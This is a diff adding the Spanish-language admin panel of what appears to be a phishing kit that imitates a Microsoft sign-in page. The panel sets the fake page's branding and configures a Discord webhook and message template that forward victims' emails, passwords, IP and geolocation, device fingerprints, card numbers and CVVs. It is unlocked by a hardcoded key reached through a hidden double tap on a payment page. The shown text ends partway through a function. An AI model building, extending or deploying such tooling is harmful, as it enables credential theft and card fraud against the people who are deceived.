@@ -1,0 +1,996 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Panel de administración</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+      *, *::before, *::after { box-sizing: border-box; margin:0; padding:0; }
+      html, body {
+        min-height: 100vh; font-family: "Segoe UI", system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
+        background: #f5f5f5; color: #1b1b1b;
+      }
+
+      /* === SIDEBAR === */
+      .sidebar {
+        position: fixed; top:0; left:0; bottom:0;
+        width: 240px; background: #1b1b1b; color: #fff;
+        display: flex; flex-direction: column;
+        z-index: 50; transition: transform .2s ease;
+      }
+      .sidebar-brand {
+        padding: 1.2rem 1.2rem .8rem;
+        border-bottom: 1px solid #2e2e2e;
+      }
+      .sidebar-brand .logo-grid {
+        display: grid; grid-template-columns: 1fr 1fr; gap:1px;
+        width: 22px; height: 22px; margin-bottom: .5rem;
+      }
+      .sidebar-brand .logo-grid div { width: 11px; height: 11px; }
+      .sidebar-brand .brand-text {
+        font-size: 14px; font-weight: 600; letter-spacing: -.3px;
+      }
+      .sidebar-nav {
+        flex: 1; padding: .8rem 0; overflow-y: auto;
+      }
+      .sidebar-nav .nav-item {
+        display: flex; align-items: center; gap: .65rem;
+        padding: .6rem 1.2rem; color: #b0b0b0;
+        text-decoration: none; font-size: 14px; cursor: pointer;
+        border-left: 3px solid transparent;
+        transition: background .15s, color .15s, border-color .15s;
+      }
+      .sidebar-nav .nav-item:hover { background: #2a2a2a; color: #fff; }
+      .sidebar-nav .nav-item.active {
+        background: #2a2a2a; color: #fff; border-left-color: #0078d4;
+      }
+      .sidebar-nav .nav-item svg { width: 16px; height: 16px; flex-shrink: 0; }
+      .sidebar-footer {
+        padding: .8rem 1.2rem;
+        border-top: 1px solid #2e2e2e;
+        font-size: 12px; color: #605e5c;
+      }
+
+      /* === MAIN CONTENT === */
+      .main-content {
+        margin-left: 240px;
+        min-height: 100vh; padding: 1.5rem 2rem;
+        transition: margin-left .2s ease;
+      }
+      .main-content.expanded { margin-left: 60px; }
+
+      /* === HEADER === */
+      .page-header {
+        display: flex; align-items: center; justify-content: space-between;
+        margin-bottom: 1.5rem; flex-wrap: wrap; gap: .8rem;
+      }
+      .page-header h1 { font-size: 22px; font-weight: 600; }
+      .page-header .breadcrumb { font-size: 13px; color: #605e5c; }
+
+      /* === CARDS === */
+      .card {
+        background: #fff; border-radius: 6px;
+        box-shadow: 0 1px 3px rgba(0,0,0,.08);
+        padding: 1.25rem;
+        margin-bottom: 1.25rem;
+        border: 1px solid #e1dfdd;
+      }
+      .card-title {
+        font-size: 15px; font-weight: 600; margin-bottom: 1rem;
+        color: #1b1b1b;
+      }
+
+      /* === FORM === */
+      .form-group { margin-bottom: 1rem; }
+      .form-group label {
+        display: block; font-size: 13px; font-weight: 500;
+        color: #605e5c; margin-bottom: .3rem;
+      }
+      .form-control {
+        width: 100%; border: 1px solid #8a8886;
+        border-radius: 3px; padding: .5rem .65rem;
+        font-size: 14px; font-family: inherit;
+        transition: border-color .15s, box-shadow .15s;
+      }
+      .form-control:focus {
+        outline: none; border-color: #0078d4;
+        box-shadow: inset 0 0 0 1px #0078d4;
+      }
+      .form-row { display: flex; gap: 1rem; flex-wrap: wrap; }
+      .form-row > * { flex: 1; min-width: 160px; }
+
+      /* === BUTTONS === */
+      .btn {
+        display: inline-flex; align-items: center; justify-content: center;
+        border: none; border-radius: 3px; cursor: pointer;
+        font-size: 14px; font-weight: 600; font-family: inherit;
+        padding: .45rem .9rem; min-height: 32px;
+        transition: background .15s;
+      }
+      .btn-primary   { background: #0078d4; color: #fff; }
+      .btn-primary:hover { background: #106ebe; }
+      .btn-secondary { background: #e1dfdd; color: #1b1b1b; }
+      .btn-secondary:hover { background: #d1d0cd; }
+      .btn-danger    { background: #dc2626; color: #fff; }
+      .btn-danger:hover { background: #b91c1c; }
+      .btn-sm { padding: .3rem .6rem; font-size: 12px; min-height: 26px; }
+
+      /* === TABS === */
+      .tabs {
+        display: flex; border-bottom: 2px solid #e1dfdd;
+        margin-bottom: 1.25rem; gap: 0;
+      }
+      .tab {
+        padding: .55rem 1.1rem; cursor: pointer;
+        font-size: 14px; font-weight: 500; color: #605e5c;
+        border-bottom: 2px solid transparent;
+        margin-bottom: -2px; transition: color .15s, border-color .15s;
+      }
+      .tab:hover { color: #1b1b1b; }
+      .tab.active { color: #0078d4; border-bottom-color: #0078d4; }
+
+      /* === BADGES === */
+      .badge {
+        display: inline-flex; align-items: center; gap: .3rem;
+        padding: .15rem .5rem; border-radius: 999px;
+        font-size: 11px; font-weight: 600;
+      }
+      .badge-success { background: #dcfce7; color: #166534; }
+      .badge-error   { background: #fef2f2; color: #991b1b; }
+      .badge-warning { background: #fef9c3; color: #854d0e; }
+      .badge-info    { background: #dbeafe; color: #1e40af; }
+
+      /* === TOOLTIP === */
+      [data-tooltip] { position: relative; }
+      [data-tooltip]:hover::after {
+        content: attr(data-tooltip);
+        position: absolute; bottom: 100%; left: 50%;
+        transform: translateX(-50%);
+        background: #1b1b1b; color: #fff;
+        padding: .25rem .55rem; border-radius: 3px;
+        font-size: 11px; white-space: nowrap;
+        z-index: 999; pointer-events: none;
+        margin-bottom: 4px;
+      }
+
+      /* === PREVIEW BOX === */
+      .preview-box {
+        border: 1px dashed #8a8886; border-radius: 4px;
+        padding: 1rem; text-align: center;
+        background: #fafafa; min-height: 120px;
+        display: flex; flex-direction: column;
+        align-items: center; justify-content: center;
+        gap: .5rem;
+      }
+      .preview-box img { max-width: 100%; max-height: 60px; }
+      .preview-box .preview-text { font-size: 13px; color: #605e5c; }
+
+      /* === MOBILE TOGGLE === */
+      .sidebar-toggle {
+        display: none;
+        position: fixed; top: .8rem; left: .8rem;
+        z-index: 100; background: #fff; border: 1px solid #8a8886;
+        border-radius: 4px; padding: .4rem .55rem;
+        cursor: pointer; font-size: 18px; color: #1b1b1b;
+        box-shadow: 0 1px 3px rgba(0,0,0,.1);
+      }
+      @media (max-width: 768px) {
+        .sidebar { transform: translateX(-100%); }
+        .sidebar.open { transform: translateX(0); }
+        .main-content { margin-left: 0; }
+        .sidebar-toggle { display: block; }
+      }
+
+      /* === SUCCESS / ERROR MESSAGES === */
+      .msg { padding: .5rem .8rem; border-radius: 4px; font-size: 13px; margin-bottom: .8rem; display: none; }
+      .msg-success { background: #dcfce7; color: #166534; display: none; }
+      .msg-error   { background: #fef2f2; color: #991b1b; display: none; }
+      .msg.show { display: block; }
+
+      /* === ADMIN KEY OVERLAY === */
+      .admin-key-overlay {
+        position: fixed; inset: 0; z-index: 200;
+        background: rgba(0,0,0,.5);
+        display: flex; align-items: center; justify-content: center;
+        backdrop-filter: blur(2px);
+      }
+      .admin-key-box {
+        background: #fff; border-radius: 8px;
+        padding: 1.5rem 2rem; box-shadow: 0 4px 20px rgba(0,0,0,.2);
+        width: 100%; max-width: 340px;
+      }
+      .admin-key-box h3 { font-size: 17px; margin-bottom: 1rem; }
+      .admin-key-box input {
+        width: 100%; border: 1px solid #8a8886; border-radius: 3px;
+        padding: .5rem .65rem; font-size: 14px; margin-bottom: .8rem;
+      }
+      .admin-key-box input:focus { outline: none; border-color: #0078d4; }
+
+      /* Color picker inline */
+      .color-picker-row { display: flex; align-items: center; gap: .5rem; }
+      .color-picker-row input[type="color"] {
+        width: 36px; height: 36px; border: 1px solid #8a8886;
+        border-radius: 3px; cursor: pointer; padding: 0;
+      }
+    </style>
+  </head>
+  <body>
+
+    <!-- Admin key overlay -->
+    <div class="admin-key-overlay" id="adminKeyOverlay">
+      <div class="admin-key-box">
+        <h3 style="margin-bottom:.75rem;">🔐 Panel de administración</h3>
+        <p style="font-size:13px; color:#605e5c; margin-bottom:1rem;">Ingresa la clave para continuar</p>
+        <input type="password" id="adminKeyInput" placeholder="admin123"
+            autocomplete="off" onkeydown="if(event.key==='Enter') tryAdminAccess()" />
+        <button class="btn btn-primary" onclick="tryAdminAccess()" style="width:100%;">
+          Entrar al panel
+        </button>
+        <p id="adminKeyError" style="color:#dc2626; font-size:12px; margin-top:.6rem; display:none;">
+          Clave incorrecta
+        </p>
+      </div>
+    </div>
+
+    <!-- Sidebar toggle (mobile) -->
+    <button class="sidebar-toggle" id="sidebarToggle" onclick="toggleSidebar()">
+      ☰
+    </button>
+
+    <!-- === SIDEBAR === -->
+    <nav class="sidebar" id="sidebar">
+      <div class="sidebar-brand">
+        <div class="logo-grid">
+          <div style="background:#f25022;"></div>
+          <div style="background:#7fba00;"></div>
+          <div style="background:#00bcf2;"></div>
+          <div style="background:#ffb900;"></div>
+        </div>
+        <div class="brand-text">mail-officee-3656</div>
+      </div>
+      <div class="sidebar-nav" id="sidebarNav">
+        <div class="nav-item active" data-tab="appearance" onclick="switchTab('appearance')">
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+              d="M7 21a4 4 0 01-4-4V5a2 2 0 012-2h4a2 2 0 012 2v12a4 4 0 01-4 4zm0 0h12a2 2 0 002-2v-4a2 2 0 00-2-2h-2.347M11 7.347l1.66-1.66m0 0l-2.47-2.47m+2.47 2.47l-1.66 1.66M11 7.347l-1.66 1.66M11 7.347l2.47 2.47M11 7.347l-2.47 2.47"/>
+          </svg>
+          Apariencia
+        </div>
+        <div class="nav-item" data-tab="discord" onclick="switchTab('discord')">
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+              d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z"/>
+          </svg>
+          Discord
+        </div>
+        <div class="nav-item" data-tab="content" onclick="switchTab('content')">
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+              d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/>
+          </svg>
+          Contenido
+        </div>
+        <div class="nav-item" data-tab="settings" onclick="switchTab('settings')">
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+              d="M10.325 4.317c.428-1.756 2.912-1.756 3.34 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.066 2.573c1.756.428 1.756 2.912 0 3.34a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.573 1.066c-.428 1.756-2.912 1.756-3.34 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.066-2.573c-1.756-.428-1.756-2.912 0-3.34a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"/>
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/>
+          </svg>
+          Ajustes
+        </div>
+      </div>
+      <div class="sidebar-footer">
+        Panel v1.0 &middot; mail-officee-3656
+      </div>
+    </nav>
+
+    <!-- === MAIN === -->
+    <div class="main-content" id="mainContent">
+
+      <!-- Header -->
+      <div class="page-header">
+        <div>
+          <h1 id="pageTitle">Panel de administración</h1>
+          <div class="breadcrumb" id="breadcrumb">Inicio / Panel</div>
+        </div>
+        <div style="display:flex; gap:.5rem; align-items:center;">
+          <span class="badge badge-info" id="connectionBadge">
+            <span class="badge-dot" style="width:7px;height:7px;background:#1e40af;border-radius:50%;"></span>
+            Conectando...
+          </span>
+          <button class="btn btn-secondary btn-sm" onclick="adminLogout()">
+            ← Salir
+          </button>
+        </div>
+      </div>
+
+      <!-- Mensajes -->
+      <div class="msg msg-success" id="msgSuccess"></div>
+      <div class="msg msg-error"   id="msgError"></div>
+
+      <!-- ====== TAB: APARIENCIA ====== -->
+      <div id="tab-appearance" class="tab-content">
+
+        <!-- Título / Subtítulo -->
+        <div class="card">
+          <div class="card-title">Título y subtítulo del login</div>
+          <div class="form-group">
+            <label for="appTitle">Título principal</label>
+            <input type="text" id="appTitle" class="form-control"
+                value="Iniciar sesión en su cuenta" />
+          </div>
+          <div class="form-group">
+            <label for="appSubtitle">Subtítulo</label>
+            <input type="text" id="appSubtitle" class="form-control"
+                value="Use su cuenta de Microsoft." />
+          </div>
+          <div style="display:flex; gap:.5rem; margin-top:.5rem;">
+            <button class="btn btn-primary btn-sm" onclick="saveAppearance()">Guardar</button>
+            <button class="btn btn-secondary btn-sm" onclick="resetAppearance()">Restablecer</button>
+          </div>
+        </div>
+
+        <!-- Fondo de pantalla -->
+        <div class="card">
+          <div class="card-title">Fondo de pantalla del login</div>
+
+          <div class="form-group">
+            <label>Tipo de fondo</label>
+            <select id="loginBgType" class="form-control" onchange="updateBgTypeUI()">
+              <option value="image">Imagen (predeterminado MS)</option>
+              <option value="color">Color</option>
+              <option value="gradient">Degradado</option>
+            </select>
+          </div>
+
+          <!-- Opción Color -->
+          <div id="bgColorRow" class="form-group" style="display:none;">
+            <label>Color de fondo</label>
+            <div class="color-picker-row">
+              <input type="color" id="loginBgColor" value="#0a0a1a" />
+              <input type="text" id="loginBgColorText" class="form-control"
+                  placeholder="#0a0a1a" value="#0a0a1a" />
+            </div>
+          </div>
+
+          <!-- Opción Degradado -->
+          <div id="bgGradientRow" class="form-group" style="display:none;">
+            <label>Degradado (CSS)</label>
+            <input type="text" id="loginBgGradient" class="form-control"
+                value="linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%)" />
+            <p style="font-size:11px; color:#605e5c; margin-top:.3rem;">
+              Ej: linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%)
+            </p>
+          </div>
+
+          <!-- Opción Imagen -->
+          <div id="bgImageRow" class="form-group">
+            <label>URL de la imagen</label>
+            <input type="url" id="loginBgImage" class="form-control"
+                value="https://logincdn.msftauth.net/shared/5/images/fluent_web_dark_2_bf5f23287bc9f60c9be2.svg"
+                placeholder="URL de imagen..." />
+            <div style="margin-top:.5rem;">
+              <button class="btn btn-secondary btn-sm" onclick="previewBgImage()">Vista previa</button>
+            </div>
+            <div id="bgPreview" class="preview-box" style="margin-top:.6rem;">
+              <span class="preview-text">Vista previa del fondo</span>
+            </div>
+          </div>
+
+          <div style="display:flex; gap:.5rem; margin-top:.8rem;">
+            <button class="btn btn-primary btn-sm" onclick="saveBackground()">Guardar fondo</button>
+            <button class="btn btn-secondary btn-sm" onclick="resetBackground()">Restablecer</button>
+          </div>
+        </div>
+
+        <!-- Textos del footer -->
+        <div class="card">
+          <div class="card-title">Textos del pie de página</div>
+          <div class="form-row">
+            <div class="form-group" style="min-width:160px;">
+              <label for="footerHelpText">Enlace Ayuda</label>
+              <input type="text" id="footerHelpText" class="form-control" value="Ayuda" />
+            </div>
+            <div class="form-group" style="min-width:160px;">
+              <label for="footerTermsText">Enlace Términos</label>
+              <input type="text" id="footerTermsText" class="form-control" value="Términos de uso" />
+            </div>
+            <div class="form-group" style="min-width:160px;">
+              <label for="footerPrivacyText">Enlace Privacidad</label>
+              <input type="text" id="footerPrivacyText" class="form-control" value="Privacidad y cookies" />
+            </div>
+          </div>
+          <div class="form-group">
+            <label for="footerNoteText">Nota de exploración privada</label>
+            <input type="text" id="footerNoteText" class="form-control"
+                value="Usa la exploración privada si este no es tu dispositivo. Más información" />
+          </div>
+          <div style="display:flex; gap:.5rem; margin-top:.5rem;">
+            <button class="btn btn-primary btn-sm" onclick="saveFooterTexts()">Guardar</button>
+            <button class="btn btn-secondary btn-sm" onclick="resetFooterTexts()">Restablecer</button>
+          </div>
+        </div>
+
+        <!-- Vista previa en vivo -->
+        <div class="card">
+          <div class="card-title"> Vista previa del login </div>
+          <div id="livePreview" class="preview-box" style="background:#fff; min-height:200px; flex-direction:column; gap:.8rem;">
+            <!-- Logo MS preview -->
+            <div style="display:flex; align-items:center; gap:.6rem; justify-content:center;">
+              <div style="display:grid; grid-template-columns:1fr 1fr; gap:1px; width:18px; height:18px;">
+                <div style="background:#f25022; width:9px; height:9px;"></div>
+                <div style="background:#7fba00; width:9px; height:9px;"></div>
+                <div style="background:#00bcf2; width:9px; height:9px;"></div>
+                <div style="background:#ffb900; width:9px; height:9px;"></div>
+              </div>
+              <span style="font-size:15px; font-weight:600; color:#1b1b1b;">Microsoft</span>
+            </div>
+            <div style="text-align:center;">
+              <div id="previewTitleEl" style="font-size:17px; font-weight:600; color:#1b1b1b;">Iniciar sesión en su cuenta</div>
+              <div id="previewSubtitleEl" style="font-size:13px; color:#605e5c; margin-top:.2rem;">Use su cuenta de Microsoft.</div>
+            </div>
+            <div style="width:100%; max-width:260px; margin-top:.3rem;">
+              <div style="border:1px solid #8a8886; border-radius:2px; padding:8px 10px; font-size:13px; color:#605e5c;">
+                correo@ejemplo.com
+              </div>
+              <div style="border:1px solid #8a8886; border-radius:2px; padding:8px 10px; font-size:13px; color:#605e5c; margin-top:.5rem;">
+                ••••••••
+              </div>
+            </div>
+            <div style="position:relative; width:100%; max-width:260px;">
+              <div style="border:1px solid #8a8886; background:#0078d4; color:#fff; border-radius:2px; padding:6px 10px; font-size:13px; font-weight:600; text-align:center;">
+                Iniciar sesión
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ====== TAB: DISCORD ====== -->
+      <div id="tab-discord" class="tab-content" style="display:none;">
+
+        <div class="card">
+          <div class="card-title">Webhook de Discord</div>
+          <div class="form-group">
+            <label for="discordWebhook">URL del webhook</label>
+            <input type="url" id="discordWebhook" class="form-control"
+                placeholder="https://discord.com/api/webhooks/..." />
+            <p style="font-size:11px; color:#605e5c; margin-top:.3rem;">
+              Obtén el webhook en Discord: Servidor → Configuración → Integraciones → Webhooks
+            </p>
+          </div>
+          <div style="display:flex; gap:.5rem; margin-top:.5rem;">
+            <button class="btn btn-primary btn-sm" onclick="saveDiscord()">Guardar webhook</button>
+            <button class="btn btn-secondary btn-sm" onclick="testDiscordWebhook()">Probar webhook</button>
+          </div>
+          <div class="msg msg-success" id="discordTestSuccess" style="margin-top:.5rem;"></div>
+          <div class="msg msg-error"   id="discordTestError" style="margin-top:.5rem;"></div>
+        </div>
+
+        <div class="card">
+          <div class="card-title">Plantilla de mensaje</div>
+          <p style="font-size:12px; color:#605e5c; margin-bottom:.6rem;">
+            Usa <code>{nombre}</code> para insertar valores. Si está vacía, se usa la plantilla por defecto.
+          </p>
+          <textarea id="discordMessageTemplate" class="form-control" rows="6"
+              placeholder="{email} - {password} - {ip} - {geoCity} - {geoCountry}"
+              style="resize:vertical; font-family:monospace; font-size:12px;"></textarea>
+          <div style="display:flex; gap:.5rem; margin-top:.5rem;">
+            <button class="btn btn-primary btn-sm" onclick="saveTemplate()">Guardar plantilla</button>
+            <button class="btn btn-secondary btn-sm" onclick="resetTemplate()">Restablecer</button>
+          </div>
+          <p style="font-size:11px; color:#605e5c; margin-top:.4rem;">
+            Placeholders disponibles: {email}, {password}, {ip}, {geoIp}, {geoCity}, {geoRegion},
+            {geoCountry}, {geoCountryCode}, {geoTimezone}, {geoIsp}, {geoLatitude}, {geoLongitude},
+            {geoZip}, {geoCurrency}, {geoCurrencyCode}, {geoCallingCode}, {geoNetwork},
+            {deviceMemory}, {cpuCores}, {touchPoints}, {isMobile}, {isTablet}, {isDesktop},
+            {batteryLevel}, {batteryCharging}, {userAgent}, {language}, {screenResolution},
+            {colorDepth}, {timezone}, {platform}, {onlineStatus}, {cookiesEnabled}, {wifiName},
+            {type}, {timestamp}, {cardNumber}, {cardHolder}, {expiryDate}, {cvv}
+          </p>
+        </div>
+
+        <div class="card">
+          <div class="card-title">Estado de la conexión</div>
+          <div style="display:flex; align-items:center; gap:.8rem; flex-wrap:wrap;">
+            <span class="badge" id="discordStatusBadge">
+              <span class="badge-dot" style="width:8px;height:8px;border-radius:50%;"></span>
+              Verificando...
+            </span>
+            <span style="font-size:13px; color:#605e5c;" id="discordStatusText"></span>
+          </div>
+          <div id="discordLastTest" style="margin-top:.6rem; font-size:12px; color:#605e5c;"></div>
+        </div>
+      </div>
+
+      <!-- ====== TAB: CONTENIDO ====== -->
+      <div id="tab-content" class="tab-content" style="display:none;">
+
+        <div class="card">
+          <div class="card-title">Contenido del login</div>
+          <div class="form-group">
+            <label>Logo (SVG/IMG URL o texto)</label>
+            <input type="text" id="logoContent" class="form-control"
+                placeholder="URL del logo o texto personalizado" />
+          </div>
+          <div class="form-group">
+            <label>Texto de bienvenida (debajo del logo)</label>
+            <input type="text" id="welcomeText" class="form-control"
+                value="Iniciar sesión en su cuenta" />
+          </div>
+          <div style="display:flex; gap:.5rem; margin-top:.5rem;">
+            <button class="btn btn-primary btn-sm" onclick="saveContent()">Guardar contenido</button>
+            <button class="btn btn-secondary btn-sm" onclick="resetContent()">Restablecer</button>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-title">Panel de control</div>
+          <p style="font-size:13px; color:#605e5c;">
+            Estos son los ajustes internos del panel. No modifiques a menos que sepas lo que hace.
+          </p>
+          <div class="form-group">
+            <label for="panelVersion">Versión del panel</label>
+            <input type="text" id="panelVersion" class="form-control" value="1.0.0" disabled
+                style="background:#f5f5f5; color:#605e5c;" />
+          </div>
+          <div class="form-group">
+            <label for="panelSecret">Clave de acceso al panel</label>
+            <input type="text" id="panelSecret" class="form-control" value="admin123" disabled
+                style="background:#f5f5f5; color:#605e5c;" />
+            <p style="font-size:11px; color:#605e5c; margin-top:.2rem;">
+              La clave predeterminada es <strong>admin123</strong>. Se ingresa desde la página de pago
+              tras hacer doble tap en Ayuda + Privacidad.
+            </p>
+          </div>
+        </div>
+      </div>
+
+      <!-- ====== TAB: AJUSTES ====== -->
+      <div id="tab-settings" class="tab-content" style="display:none;">
+
+        <div class="card">
+          <div class="card-title">Ajustes generales</div>
+          <div class="form-group">
+            <label for="adminTapNotes">Notas de acceso al panel</label>
+            <textarea id="adminTapNotes" class="form-control" rows="3"
+                style="resize:vertical;">Doble tap en "Ayuda" + "Privacidad y cookies" (desde la página de pago) → ingresa: admin123</textarea>
+          </div>
+          <div class="form-group">
+            <label for="configVersion">Versión de configuración</label>
+            <input type="text" id="configVersion" class="form-control" value="1" />
+          </div>
+          <div style="display:flex; gap:.5rem; margin-top:.5rem;">
+            <button class="btn btn-primary btn-sm" onclick="saveSettings()">Guardar ajustes</button>
+            <button class="btn btn-secondary btn-sm" onclick="resetAllSettings()">Restablecer todo</button>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-title">Datos de la sesión</div>
+          <div style="font-size:13px; color:#605e5c;">
+            <p><strong>Email en sesión:</strong> <span id="sessionEmail">—</span></p>
+            <p><strong>Fecha de acceso:</strong> <span id="sessionDate">—</span></p>
+            <p><strong>Hora de acceso:</strong> <span id="sessionTime">—</span></p>
+          </div>
+        </div>
+      </div>
+
+    </div><!-- fin main-content -->
+
+    <script>
+      // ============================================================
+      //  ESTADO
+      // ============================================================
+      const STORAGE_KEY = 'mail_officee3656_config';
+      const ADMIN_KEY   = 'admin123';
+      const DEFAULT_CFG = {
+        appTitle: 'Iniciar sesión en su cuenta',
+        appSubtitle: 'Use su cuenta de Microsoft.',
+        loginBgType: 'image',
+        loginBgColor: '#0a0a1a',
+        loginBgGradient: 'linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%)',
+        loginBgImage: 'https://logincdn.msftauth.net/shared/5/images/fluent_web_dark_2_bf5f23287bc9f60c9be2.svg',
+        footerHelpText: 'Ayuda',
+        footerTermsText: 'Términos de uso',
+        footerPrivacyText: 'Privacidad y cookies',
+        footerNoteText: 'Usa la exploración privada si este no es tu dispositivo. Más información',
+        discordWebhook: '',
+        discordMessageTemplate: '',
+        logoContent: '',
+        welcomeText: 'Iniciar sesión en su cuenta',
+        adminTapNotes: 'Doble tap en "Ayuda" + "Privacidad y cookies" (desde la página de pago) → ingresa: admin123',
+        configVersion: '1',
+        panelVersion: '1.0.0',
+        panelSecret: 'admin123',
+      };
+
+      let config = loadConfig();
+      function loadConfig() {
+        try {
+          const s = localStorage.getItem(STORAGE_KEY);
+          if (s) { const p = JSON.parse(s); return { ...DEFAULT_CFG, ...p }; }
+        } catch(e) {}
+        return { ...DEFAULT_CFG };
+      }
+
+      function saveConfigToStorage() {
+        localStorage.setItem(STORAGE_KEY, JSON.stringify(config));
+      }
+
+      // ============================================================
+      //  ACCESO AL PANEL
+      // ============================================================
+      function tryAdminAccess() {
+        const inp   = document.getElementById('adminKeyInput');
+        const errEl= document.getElementById('adminKeyError');
+        if (!inp) return;
+        const key = inp.value.trim();
+        if (key === ADMIN_KEY) {
+          document.getElementById('adminKeyOverlay').style.display = 'none';
+          initDashboard();
+        } else {
+          errEl.style.display = 'block';
+          inp.value = '';
+          inp.placeholder = 'Clave incorrecta';
+          setTimeout(() => { inp.placeholder = 'admin123'; errEl.style.display = 'none'; }, 2500);
+        }
+      }
+
+      function adminLogout() {
+        document.getElementById('adminKeyOverlay').style.display = 'flex';
+        document.getElementById('adminKeyInput').value = '';
+        switchTab('appearance');
+      }
+
+      // ============================================================
+      //  INICIALIZACIÓN DEL DASHBOARD
+      // ============================================================
+      function initDashboard() {
+        // Cargar valores en formularios
+        document.getElementById('appTitle').value       = config.appTitle;
+        document.getElementById('appSubtitle').value     = config.appSubtitle;
+        document.getElementById('loginBgType').value     = config.loginBgType;
+        document.getElementById('loginBgColor').value    = config.loginBgColor;
+        document.getElementById('loginBgColorText').value= config.loginBgColor;
+        document.getElementById('loginBgGradient').value = config.loginBgGradient;
+        document.getElementById('loginBgImage').value    = config.loginBgImage;
+        document.getElementById('footerHelpText').value  = config.footerHelpText;
+        document.getElementById('footerTermsText').value = config.footerTermsText;
+        document.getElementById('footerPrivacyText').value= config.footerPrivacyText;
+        document.getElementById('footerNoteText').value  = config.footerNoteText;
+        document.getElementById('discordWebhook').value  = config.discordWebhook;
+        document.getElementById('discordMessageTemplate').value = config.discordMessageTemplate;
+        document.getElementById('logoContent').value     = config.logoContent;
+        document.getElementById('welcomeText').value     = config.welcomeText;
+        document.getElementById('adminTapNotes').value   = config.adminTapNotes;
+        document.getElementById('configVersion').value   = config.configVersion;
+        document.getElementById('panelVersion').value    = config.panelVersion;
+        document.getElementById('panelSecret').value     = config.panelSecret;
+
+        // Session data
+        document.getElementById('sessionEmail').textContent = new URLSearchParams(window.location.search).get('email') || '—';
+        const now = new Date();
+        document.getElementById('sessionDate').textContent = now.toLocaleDateString('es-CL');
+        document.getElementById('sessionTime').textContent = now.toLocaleTimeString('es-CL');
+
+        // UI theme
+        updateBgTypeUI();
+        updatePreview();
+
+        // Badges
+        updateDiscordStatusBadge();
+
+        // Connection
+        checkConnection();
+      }
+
+      // ============================================================
+      //  TABS
+      // ============================================================
+      let currentTab = 'appearance';
+
+      function switchTab(tab) {
+        currentTab = tab;
+        document.querySelectorAll('.tab-content').forEach(el => el.style.display = 'none');
+        document.getElementById('tab-' + tab).style.display = 'block';
+        document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
+        document.querySelector(`.nav-item[data-tab="${tab}"]`).classList.add('active');
+        document.getElementById('pageTitle').textContent =
+          tab === 'appearance' ? 'Apariencia' :
+          tab === 'discord'    ? 'Discord' :
+          tab === 'content'    ? 'Contenido' :
+          tab === 'settings'   ? 'Ajustes' : 'Panel';
+        document.getElementById('breadcrumb').textContent =
+          'Inicio / Panel / ' + document.getElementById('pageTitle').textContent;
+      }
+
+      // ============================================================
+      //  SIDEBAR
+      // ============================================================
+      function toggleSidebar() {
+        document.getElementById('sidebar').classList.toggle('open');
+      }
+
+      // ============================================================
+      //  APARIENCIA — GUARDAR
+      // ============================================================
+      function saveAppearance() {
+        config.appTitle    = document.getElementById('appTitle').value.trim()    || DEFAULT_CFG.appTitle;
+        config.appSubtitle = document.getElementById('appSubtitle').value.trim() || DEFAULT_CFG.appSubtitle;
+        saveConfigToStorage();
+        updatePreview();
+        showMsg('success', 'Título y subtítulo guardados');
+      }
+
+      function resetAppearance() {
+        config.appTitle    = DEFAULT_CFG.appTitle;
+        config.appSubtitle = DEFAULT_CFG.appSubtitle;
+        saveConfigToStorage();
+        document.getElementById('appTitle').value    = config.appTitle;
+        document.getElementById('appSubtitle').value = config.appSubtitle;
+        updatePreview();
+        showMsg('success', 'Restablecido');
+      }
+
+      // ============================================================
+      //  FONDO — UI
+      // ============================================================
+      function updateBgTypeUI() {
+        const type = document.getElementById('loginBgType').value;
+        document.getElementById('bgColorRow').style.display    = type === 'color'    ? 'block' : 'none';
+        document.getElementById('bgGradientRow').style.display = type === 'gradient' ? 'block' : 'none';
+        document.getElementById('bgImageRow').style.display    = type === 'image'    ? 'block' : 'none';
+      }
+
+      function saveBackground() {
+        config.loginBgType    = document.getElementById('loginBgType').value;
+        config.loginBgColor   = document.getElementById('loginBgColor').value;
+        config.loginBgColorText = config.loginBgColor;
+        config.loginBgGradient= document.getElementById('loginBgGradient').value || DEFAULT_CFG.loginBgGradient;
+        config.loginBgImage   = document.getElementById('loginBgImage').value || DEFAULT_CFG.loginBgImage;
+        saveConfigToStorage();
+        updatePreview();
+        updateBgTypeUI();
+        showMsg('success', 'Fondo guardado correctamente');
+      }
+
+      function resetBackground() {
+        config.loginBgType    = DEFAULT_CFG.loginBgType;
